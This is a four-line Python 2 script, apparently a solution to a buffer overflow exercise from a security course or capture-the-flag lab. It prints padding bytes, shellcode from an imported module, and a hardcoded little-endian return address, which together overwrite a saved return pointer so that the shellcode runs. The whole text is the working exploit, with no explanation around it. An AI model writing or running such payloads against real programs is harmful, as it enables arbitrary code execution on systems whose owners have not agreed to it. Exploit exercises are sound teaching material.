from shellcode import shellcode
from struct import pack
addr = pack("<I", 0xbffee728)
print "\x5a" * 1013  + shellcode + addr
